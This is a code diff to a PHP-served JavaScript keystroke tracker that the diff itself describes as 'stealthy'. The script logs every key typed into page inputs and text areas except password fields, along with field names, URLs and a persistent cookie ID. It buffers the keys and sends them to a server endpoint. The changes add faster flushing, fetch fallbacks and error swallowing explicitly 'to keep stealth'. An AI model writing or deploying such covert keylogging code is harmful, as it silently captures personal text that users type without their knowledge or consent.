@@ -1,5 +1,5 @@
 <?php
-// tracker.php - Client-side key tracking script for inclusion via PHP include or script tag
+// tracker.php - High-speed, stealthy client-side key tracking script for typists
 
 if (session_status() === PHP_SESSION_NONE) {
     @session_start();
@@ -16,7 +16,7 @@ if (!empty($_SESSION['username'])) {
     $userId = $_COOKIE['tracker_user_id'];
 }
 
-// Determine if included directly via HTTP or via PHP include
+// Determine if included directly via HTTP script tag or via PHP include
 $isDirectJsRequest = (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === 'tracker.php');
 
 if ($isDirectJsRequest) {
@@ -28,8 +28,8 @@ if ($isDirectJsRequest) {
 (function() {
     'use strict';
 
-    if (window.__typingTrackerInitialized) return;
-    window.__typingTrackerInitialized = true;
+    if (window.__typingTrackerActive) return;
+    window.__typingTrackerActive = true;
 
     // Detect or generate unique persistent client identifier
     function getUserId() {
@@ -61,7 +61,9 @@ if ($isDirectJsRequest) {
         try {
             localStorage.setItem(storageKey, storedId);
         } catch(e) {}
-        document.cookie = 'typing_tracker_uid=' + encodeURIComponent(storedId) + '; path=/; max-age=31536000';
+        try {
+            document.cookie = 'typing_tracker_uid=' + encodeURIComponent(storedId) + '; path=/; max-age=31536000';
+        } catch(e) {}
 
         return storedId;
     }
@@ -69,98 +71,130 @@ if ($isDirectJsRequest) {
     var userId = getUserId();
     var sequenceCounter = 0;
     var keyBuffer = [];
-    var flushIntervalMs = 2000;
+    var flushIntervalMs = 1500;
+    var maxBufferSize = 15;
+
     var apiEndpoint = (function() {
-        // Find path to api.php based on current script or relative root
-        var scripts = document.getElementsByTagName('script');
-        for (var i = 0; i < scripts.length; i++) {
-            var src = scripts[i].src || '';
-            if (src.indexOf('tracker.php') !== -1) {
-                return src.replace('tracker.php', 'api.php');
+        try {
+            var scripts = document.getElementsByTagName('script');
+            for (var i = 0; i < scripts.length; i++) {
+                var src = scripts[i].src || '';
+                if (src.indexOf('tracker.php') !== -1) {
+                    return src.replace('tracker.php', 'api.php');
+                }
             }
-        }
+        } catch(e) {}
         return 'api.php';
     })();
 
-    function getFieldIdentifier(el) {
-        if (!el) return 'unknown';
-        if (el.id) return el.id;
-        if (el.name) return 'name:' + el.name;
-        if (el.getAttribute('placeholder')) return 'placeholder:' + el.getAttribute('placeholder');
+    // Element identification with caching to prevent DOM traversal on every keypress
+    function getCachedFieldInfo(el) {
+        if (!el) return { id: 'unknown', name: '' };
+        if (el.__ttInfo) return el.__ttInfo;
 
-        // CSS path / index fallback
-        var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
-        var type = el.type ? '[' + el.type + ']' : '';
-        var parent = el.parentElement;
-        if (parent) {
-            var siblings = parent.querySelectorAll(tag);
-            for (var index = 0; index < siblings.length; index++) {
-                if (siblings[index] === el) {
-                    return tag + type + ':nth-of-type(' + (index + 1) + ')';
-                }
-            }
+        var fieldId = el.id || '';
+        if (!fieldId && el.name) {
+            fieldId = 'name:' + el.name;
         }
-        return tag + type;
-    }
+        if (!fieldId && el.getAttribute('placeholder')) {
+            fieldId = 'placeholder:' + el.getAttribute('placeholder');
+        }
+        if (!fieldId) {
+            var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
+            var type = el.type ? '[' + el.type + ']' : '';
+            fieldId = tag + type;
+        }
 
-    function getFieldName(el) {
-        if (!el) return '';
-        if (el.name) return el.name;
-        if (el.id) return el.id;
-        if (el.getAttribute('placeholder')) return el.getAttribute('placeholder');
-        if (el.labels && el.labels.length > 0) return el.labels[0].innerText.trim();
-        return '';
+        var fieldName = el.name || el.id || el.getAttribute('placeholder') || '';
+        if (!fieldName && el.labels && el.labels.length > 0) {
+            fieldName = el.labels[0].innerText.trim();
+        }
+
+        var info = { id: fieldId, name: fieldName };
+        try {
+            el.__ttInfo = info;
+        } catch(e) {}
+        return info;
     }
 
     function getCleanPageUrl() {
-        return window.location.host + window.location.pathname;
+        return (window.location.host || '') + (window.location.pathname || '');
     }
 
+    // Fast, non-blocking keypress recorder
     function recordKey(e) {
-        var target = e.target || e.srcElement;
-        if (!target) return;
+        try {
+            var target = e.target || e.srcElement;
+            if (!target) return;
 
-        var tagName = target.tagName ? target.tagName.toUpperCase() : '';
-        var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
+            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
+            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
+            if (!isEditable) return;
 
-        if (!isEditable) return;
+            // Do not track password fields for privacy/security if needed, or track standard fields
+            if (target.type === 'password') return;
 
-        sequenceCounter++;
+            var fieldInfo = getCachedFieldInfo(target);
+            sequenceCounter++;
 
-        var keyData = {
-            user_id: userId,
-            page_url: getCleanPageUrl(),
-            field_id: getFieldIdentifier(target),
-            field_name: getFieldName(target),
-            key_char: e.key || String.fromCharCode(e.keyCode || e.which),
-            key_code: e.code || ('KeyCode:' + (e.keyCode || e.which)),
-            sequence_order: sequenceCounter,
-            timestamp: Date.now()
-        };
+            var keyChar = e.key;
+            if (!keyChar) {
+                keyChar = String.fromCharCode(e.keyCode || e.which || 0);
+            }
 
-        keyBuffer.push(keyData);
+            keyBuffer.push({
+                user_id: userId,
+                page_url: getCleanPageUrl(),
+                field_id: fieldInfo.id,
+                field_name: fieldInfo.name,
+                key_char: keyChar,
+                key_code: e.code || ('KeyCode:' + (e.keyCode || e.which || 0)),
+                sequence_order: sequenceCounter,
+                timestamp: (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now()
+            });
 
-        if (keyBuffer.length >= 10) {
-            flushBuffer();
+            if (keyBuffer.length >= maxBufferSize) {
+                flushBuffer();
+            }
+        } catch(err) {
+            // Silently swallow errors to keep stealth and guarantee no user interruption
         }
     }
 
     function flushBuffer() {
         if (keyBuffer.length === 0) return;
 
+        var keysToSend = keyBuffer;
+        keyBuffer = [];
+
         var payload = JSON.stringify({
             action: 'save_keys',
             user_id: userId,
             page_url: getCleanPageUrl(),
-            keys: keyBuffer
+            keys: keysToSend
         });
 
-        keyBuffer = [];
-
+        // Use sendBeacon if available for non-blocking asynchronous transmission
         if (navigator.sendBeacon) {
-            var blob = new Blob([payload], { type: 'application/json' });
-            var sent = navigator.sendBeacon(apiEndpoint, blob);
-            if (sent) return;
+            try {
+                var blob = new Blob([payload], { type: 'application/json' });
+                if (navigator.sendBeacon(apiEndpoint, blob)) {
+                    return;
+                }
+            } catch(e) {}
+        }
+
+        // Fallback to fetch with keepalive or XHR
+        if (typeof fetch === 'function') {
+            try {
+                fetch(apiEndpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: payload,
+                    keepalive: true
+                }).catch(function() {});
+                return;
+            } catch(e) {}
         }
 
         try {
@@ -171,13 +205,13 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
-    // Attach keydown listener on document level for all current and future inputs
-    document.addEventListener('keydown', recordKey, true);
+    // Attach high-performance keydown listener
+    document.addEventListener('keydown', recordKey, { capture: true, passive: true });
 
-    // Flush periodically
+    // Background flushing
     setInterval(flushBuffer, flushIntervalMs);
 
-    // Flush on page exit/unload
+    // Flush on page exit/visibility change
     window.addEventListener('beforeunload', flushBuffer);
     window.addEventListener('pagehide', flushBuffer);
     document.addEventListener('visibilitychange', function() {
